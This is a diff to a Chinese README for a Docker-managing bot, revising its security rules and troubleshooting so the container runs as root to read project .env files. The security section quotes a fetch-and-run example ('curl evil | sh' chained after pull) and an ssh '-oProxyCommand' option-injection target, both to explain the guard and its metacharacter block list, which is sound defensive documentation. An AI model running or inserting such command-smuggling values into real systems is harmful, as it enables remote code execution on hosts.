@@ -321,7 +321,7 @@ docker compose exec mtbots python -m mtbots --health | grep 🐳
 3. **Docker 特权集中在一个模块**：`docker.sock` 只被 `features/docker` 使用并受 ACL 限制。想进一步收窄可换 `docker-socket-proxy`（主进程只发 HTTP，见设计稿 §6）。
 4. **密钥渲染带 user_id**：Cline 面板只渲染调用者自己的 Key；LitePan 按 `chat_id` 绑定实例，不串台。
 5. **破坏性操作两步确认**：确认按钮绑定发起人 + 60 秒过期（`PanelManager.ask_confirm/validate_confirm`）。
-6. **非 root + 只读根文件系统**（compose 已配 `read_only` / `no-new-privileges`），只有 `data/` 与挂载的 compose 目录可写。
+6. **只读根文件系统 + 禁止提权**（compose 已配 `read_only` / `no-new-privileges`），只有 `data/` 与挂载的 compose 目录可写。容器**以 root 运行**（compose 里的 `user: "0:0"`）——`docker compose` 解析项目时必须能读项目目录下的 `.env`（通常 `root:600`），保持 10001 就得给每个项目的 `.env` 单独放权限、新项目还得再来一次。因为容器已经挂了 `docker.sock`（等价于宿主机 root），这一步并没有扩大实际权限边界；要真正收敛请上 `docker-socket-proxy`。
 7. **远端主机不给 bot 任何端口或 socket**，只放一把被 `authorized_keys` 强制命令收窄的 ssh key：守卫限定 16 条白名单形态，并整条拒绝含 shell 元字符的命令（分号、`&`、`|`、`$`、反引号、`\`、`>`、`<`）——否则 `… pull; curl evil | sh` 会被尾部 `*` 匹配放行。即使 bot 主机被拿下也拿不到远端 shell。
 8. **ssh 目标不允许以 `-` 开头**，包装命令里 `--` 放在目标**之前**结束选项解析，否则 `-oProxyCommand=…@host` 这种 target 会被 ssh 当成选项（选项注入）。
 9. **多主机回调只认配置里的 host id**：面板里的主机名来自 `data/docker-hosts.json`，伪造的 id 会被拒并记日志，绝不会拿去拼命令。
@@ -381,7 +381,7 @@ make check
 手工核对用宿主机上的 `stat -c '%g' /var/run/docker.sock`。NAS（busybox）上常常没有 `docker` 组条目，`getent group docker` 返回空，只能猜，线上就有人先猜 998、再猜 0，两次都无效。两个坑：
 
 * 改完 `.env` **必须** `--force-recreate`：`docker compose restart` 不会重新套用 `group_add`；
-* 查出来是 `0`（socket 属 `root:root`，群晖等 NAS 常见）时加组救不了：要么让容器用 root 跑（compose 里加 `user: "0:0"`），要么上 `docker-socket-proxy`。
+* 查出来是 `0`（socket 属 `root:root`，群晖等 NAS 常见）时加组救不了：要么上 `docker-socket-proxy`，要么让容器用 root 跑。**本仓库的 compose 现在默认就是 `user: "0:0"`**（原因见[安全红线](#安全红线)第 6 条），所以这种情况不会再出现。
 
 **情况二：项目扫到了，但目录在容器里不存在。** 这是权限修好后紧接着会撞上的第二个坑：
 
@@ -401,7 +401,7 @@ make check
 
 改完 `docker compose up -d`（加 `--force-recreate` 更保险）。项目散在不同根下时面板不给公共 `-v`，逐个挂。
 
-**情况三：项目看得见、服务列表却是 `⚠️ 未获取：…`。** 这是第三类"读不到"，原因通常不在挂载，而在**项目目录下 `.env` 的属主**：`docker compose -f <文件> config --services` 必须能读同目录的 `.env`，而 `.env` 一般归 root（`600`），容器用户（uid 10001）读不到；一旦 compose 文件里用了 `${VAR:?}`，插值失败会让这条命令整体失败（0 行输出）。bot 会自动退回**容器 label** 读服务名（`docker ps -a --filter label=com.docker.compose.project=…`，不读任何文件），面板标「来自容器」（含已停止的容器），因此**不必也不建议**把 `.env` 交给容器用户——那会把它里面的密钥暴露给 bot 里运行的所有代码。只有在项目连容器都没建过时，兜底才会没结果。
+**情况三：项目看得见、服务列表却是 `⚠️ 未获取：…`。** 服务列表先试 `docker compose -f <文件> config --services`，读不到项目目录下的 `.env` 就退回**容器 label**（`docker ps -a --filter label=com.docker.compose.project=…`，不读文件、不需要权限），面板标「来自容器」（含已停止的容器）；两级都失败才显示原因。**执行类操作（`pull` / `up -d` / `stop`）没有这层兜底**——它们必须让 compose 真正读到 `.env`，所以本仓库的 compose 默认以 `user: "0:0"` 运行（[安全红线](#安全红线)第 6 条）：容器里是 root，能读宿主机的 `.env`，不必也不建议去改项目文件的属主或权限。
 
 ## 已知限制
 
